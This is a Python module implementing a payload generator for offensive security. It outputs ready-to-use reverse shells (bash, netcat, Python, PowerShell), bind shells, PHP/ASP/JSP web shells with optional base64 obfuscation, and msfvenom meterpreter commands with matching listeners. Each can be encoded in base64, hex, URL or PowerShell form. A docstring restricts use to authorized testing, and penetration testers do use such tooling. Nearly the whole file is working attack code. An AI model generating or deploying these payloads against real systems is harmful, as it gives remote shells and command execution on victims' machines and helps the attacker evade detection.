from __future__ import annotations

import base64
import binascii
import json
import shlex
from dataclasses import dataclass, asdict
from enum import Enum
from typing import Dict, Optional


class PayloadType(str, Enum):
    REVERSE_TCP = "reverse_tcp"
    BIND_TCP = "bind_tcp"
    WEB_SHELL = "web_shell"
    POWERSHELL = "powershell"


class PayloadFormat(str, Enum):
    RAW = "raw"
    BASE64 = "base64"
    HEX = "hex"
    URL = "url"
    PS_BASE64 = "ps_base64"


@dataclass
class Payload:
    type: str
    platform: str
    description: str
    code: str
    usage: str
    encoded: Optional[Dict[str, str]] = None

    def to_json(self) -> str:
        return json.dumps(asdict(self), ensure_ascii=False, indent=2)


def _b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


def _hex(s: str) -> str:
    return binascii.hexlify(s.encode()).decode()


def _url(s: str) -> str:
    # Minimal URL-safe encoder to avoid extra deps
    safe = []
    for ch in s.encode():
        if (65 <= ch <= 90) or (97 <= ch <= 122) or (48 <= ch <= 57) or ch in (45, 95, 46, 126):
            safe.append(chr(ch))
        else:
            safe.append("%{:02X}".format(ch))
    return "".join(safe)


def _ps_base64(cmd: str) -> str:
    # PowerShell expects UTF-16LE encoded data for -EncodedCommand
    data = cmd.encode("utf-16le")
    return base64.b64encode(data).decode()


class PayloadGenerator:
    """Generate common offensive payloads for authorized testing.

    WARNING: Use only on systems you own or have explicit permission to test.
    """

    def list_available_payloads(self) -> Dict[str, list]:
        return {
            "reverse_shells": [
                "bash", "netcat", "python", "powershell"
            ],
            "bind_shells": [
                "bash", "netcat"
            ],
            "web_shells": [
                "php", "asp", "jsp"
            ],
        }

    # ---- High-level helpers used by CLI ----
    def generate_reverse_shell(self, lhost: str, lport: int, shell_type: str, encoder: Optional[str] = None) -> Payload:
        shell_type = (shell_type or "bash").lower()
        code = self._reverse_code(shell_type, lhost, lport)
        encoded = self._maybe_encode(code, encoder, shell_type)
        usage = f"Set listener (e.g., nc -lvnp {lport}) then deliver payload to target"
        return Payload(
            type=PayloadType.REVERSE_TCP.value,
            platform="windows" if shell_type == "powershell" else "linux",
            description=f"Reverse shell via {shell_type}",
            code=code,
            usage=usage,
            encoded=encoded,
        )

    def generate_bind_shell(self, lport: int, shell_type: str) -> Payload:
        shell_type = (shell_type or "bash").lower()
        if shell_type == "netcat":
            code = f"nc -lvnp {lport} -e /bin/bash"
        else:
            code = f"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp {lport} > /tmp/f"
        usage = f"Connect from attacker: nc <target> {lport}"
        return Payload(
            type=PayloadType.BIND_TCP.value,
            platform="linux",
            description=f"Bind shell on port {lport} using {shell_type}",
            code=code,
            usage=usage,
            encoded=None,
        )

    def generate_web_shell(self, shell_type: str, obfuscate: bool = False) -> Payload:
        shell_type = (shell_type or "php").lower()
        if shell_type == "php":
            code = "<?php system($_REQUEST['cmd']); ?>"
        elif shell_type == "asp":
            code = "<% Set o=CreateObject(\"WScript.Shell\") : Response.Write o.Exec(Request(\"cmd\")).StdOut.ReadAll() %>"
        else:  # jsp
            code = "<%@ page import=\"java.io.*\" %><% String cmd=request.getParameter(\"cmd\"); if(cmd!=null){ Process p=Runtime.getRuntime().exec(cmd); InputStream in=p.getInputStream(); int a= -1; while((a=in.read())!=-1){ out.print((char)a);} } %>"
        if obfuscate and shell_type == "php":
            b64 = _b64(code)
            code = f"<?php eval(base64_decode('{b64}')); ?>"
        usage = "Deploy to a web-executable location. Invoke with ?cmd=..."
        return Payload(
            type=PayloadType.WEB_SHELL.value,
            platform="web",
            description=f"Simple {shell_type} web shell",
            code=code,
            usage=usage,
            encoded=None,
        )

    def generate_powershell_payload(self, lhost: str, lport: int, encoder: str = "base64") -> Payload:
        cmd = (
            "$client = New-Object System.Net.Sockets.TCPClient(\"%s\",%d);$stream = $client.GetStream();"
            "$writer = New-Object System.IO.StreamWriter($stream);$buffer = New-Object System.Byte[] 1024;"
            "while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$writer.Write($sendback2);$writer.Flush()};$client.Close()"
        ) % (lhost, lport)
        encoded: Optional[Dict[str, str]] = None
        if encoder:
            encoded = {"ps_base64": _ps_base64(cmd)}
        usage = f"PowerShell reverse over TCP to {lhost}:{lport}. Listener: nc -lvnp {lport}"
        return Payload(
            type=PayloadType.POWERSHELL.value,
            platform="windows",
            description="PowerShell reverse shell",
            code=cmd,
            usage=usage,
            encoded=encoded,
        )

    # ---- Msfvenom helper used by CLI ----
    def generate_msfvenom_command(self, payload_type: str, lhost: str, lport: int, platform: str, arch: str = "x64", format: str = "exe") -> Dict[str, str]:
        platform = (platform or "linux").lower()
        if platform == "windows":
            payload = "windows/x64/meterpreter/reverse_tcp" if arch == "x64" else "windows/meterpreter/reverse_tcp"
        else:
            payload = "linux/x64/meterpreter_reverse_tcp" if arch == "x64" else "linux/x86/meterpreter_reverse_tcp"

        cmd = (
            f"msfvenom -p {shlex.quote(payload)} LHOST={shlex.quote(lhost)} LPORT={int(lport)} -f {shlex.quote(format)}"
        )

        listener = (
            "msfconsole -q -x \"use exploit/multi/handler;"
            f" set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {int(lport)}; run\""
        )

        return {
            "platform": platform,
            "arch": arch,
            "payload": payload,
            "format": format,
            "command": cmd,
            "listener": listener,
            "description": "Generate meterpreter payload and matching handler commands",
        }

    # ---- Internals ----
    def _reverse_code(self, shell_type: str, lhost: str, lport: int) -> str:
        if shell_type == "bash":
            return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        if shell_type == "netcat":
            return f"nc {lhost} {lport} -e /bin/bash"
        if shell_type == "python":
            return (
                "python3 -c \"import os,pty,socket;s=socket.socket();s.connect(('" + lhost + "'," + str(lport) + "));"
                "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/bash')\""
            )
        if shell_type == "powershell":
            return (
                f"powershell -nop -w hidden -c \"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{int(lport)});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$o=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($o,0,$o.Length)}}\""
            )
        # Fallback
        return f"/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"

    def _maybe_encode(self, code: str, encoder: Optional[str], shell_type: str) -> Optional[Dict[str, str]]:
        if not encoder:
            return None
        enc = encoder.lower()
        result: Dict[str, str] = {}
        if enc in ("base64", "all"):
            result["base64"] = _b64(code)
        if enc in ("hex", "all"):
            result["hex"] = _hex(code)
        if enc in ("url", "all"):
            result["url"] = _url(code)
        if enc in ("ps_base64", "all") or shell_type == "powershell":
            result["ps_base64"] = _ps_base64(code)
        return result or None
